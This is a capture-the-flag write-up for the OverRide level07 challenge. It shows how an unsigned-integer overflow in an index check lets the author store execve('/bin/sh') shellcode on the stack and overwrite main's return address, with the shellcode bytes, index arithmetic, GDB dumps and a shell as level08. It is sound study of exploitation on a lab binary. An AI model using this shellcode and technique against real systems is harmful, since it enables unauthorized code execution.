# Tools
[Dogbolt - Decompiler Explorator](https://dogbolt.org/)
[Cutter - Reverse Engineering Tool](https://cutter.re/)
[GNU DeBugger - GDB](https://fr.wikipedia.org/wiki/GNU_Debugger)

# Exploit 
Level07 calls on your analysis capabilities to find the cracks into a "secured" program.

# Explanation
Start of the nbs buffer at: `0xffffd528` (1073741824 is an index that will write result in index 0, see below)
```
Input command: store
 Number: 1094795585
 Index: 1073741824
 Completed store command successfully
(gdb) x/20x $esp
...
0xffffd520:	0x00000000	0x41414141	0x00000000	0x00000000
...
```

What we want to do is write a shellcode inside of the stack using the store option of the program.

Shellcode (see Resources at the bottom of the page): 
```
"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
```

```
Shellcode in dwords:
0xe1f7c931 0x2f2f6851 0x2f686873 0x896e6962 0xcd0bb0e3 0x00000080
Addresses at which to write each shellcode dword:
0xffffd524 0xffffd528 0xffffd52c 0xffffd530 0xffffd534 0xffffd538
```

Now, let's bypass the restricted index security.
The max value for an unsigned int is `4294967295`.
The index we provide is going to be multiplied by 4 (the size of an int) to resolve the address at which the number must be placed in `nbs`.
Thus, we could overflow index by using `4294967295 / 4 + desired_index + 1`. When a space is reserved by will using that method, we can still use the normal way of storing numbers.

See `Resources/test.c` for the debug information I added.

Writing to the first addresses of `nbs`:
```
Input command: store
 Number: 1
 Index: 1073741824
Unum: 1
Index: 1073741824
Index*Sizeof(int): 0
 Completed store command successfully
Input command: store
 Number: 1
 Index: 1073741825
Unum: 1
Index: 1073741825
Index*Sizeof(int): 4
 Completed store command successfully
Input command: store
 Number: 1
 Index: 1073741827
Unum: 1
Index: 1073741827
Index*Sizeof(int): 12
 Completed store command successfully
Input command: store
 Number: 1
 Index: 1073741826
Unum: 1
Index: 1073741826
Index*Sizeof(int): 8
Mod: 1 / other: 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 1
 Index: 2
Unum: 1
Index: 2
Index*Sizeof(int): 8
 Completed store command successfully
Input command: read
 Index: 0
 Number at data[0] is 1
 Completed read command successfully
Input command: read
 Index: 1
 Number at data[1] is 1
 Completed read command successfully
Input command: read
 Index: 2
 Number at data[2] is 1
 Completed read command successfully
Input command: read
 Index: 3
 Number at data[3] is 1
 Completed read command successfully
```

Now, to hijack the execution, we want to overwrite the return address of the `main` function.

Before overwriting:
```
(gdb) x/120x $esp
...
0xffffd6e0:	0x00000000	0x00000000	0x00000000	0xf7e45513
...
```
`0xf7e45513` is the return address of main in `__libc_start_main`
```
(gdb) x 0xf7e45513
0xf7e45513 <__libc_start_main+243>:	0xe8240489
```
We calculate the offset with the start of the `nbs` buffer:
`RETURN_ADDR - START_ADDR = 0xf7e45513 - 0xffffd528 = 0x1bc = 444` 
After some figeting, we see that the index at which we must put the value is: `1073741938`, approximately calculated with the formula `4294967295 / 4 + desired_offset / 4 + 4`, where desired offset here is 444.

We thus get: `1073741938`, and we can write `beefdead` where the return address is being stored:
```
Input command: store
 Number: 3203391149
 Index: 1073741938
 Completed store command successfully

Breakpoint 1, 0x080488ea in main ()
(gdb) x/200x $esp
0xffffd500:	0xffffd524	0x00000014	0xf7fcfac0	0xf7fdc714
...
0xffffd6e0:	0x00000000	0x00000000	0x00000000	0xbeefdead
...
```
After overwriting the return address (see the `0xbeefdead`?):
```
0xffffd6e0:	0x00000000	0x00000000	0x00000000	0xbeefdead
```
Which causes a segfault:
```
Program received signal SIGSEGV, Segmentation fault.
0xbeefdead in ?? ()
```

Next time, instead of writing `beefdead`, we write `0xffffd524` (int: `4294956324`), the start address of the `nbs` buffer!

Now, let's pack the shellcode and the return address modification to get the flag!

To make things more simple, I have ran the exploit with `env -i` some addresses might have shifted between the explanations and the actual exploit.
See `Resources/script.py`.
```
level07@OverRide:~$ python script.py > input && cat input - | env -i level07
...
whoami
level08
```

# Resources
[Shellcode from kernel_panik](https://shell-storm.org/shellcode/files/shellcode-752.html)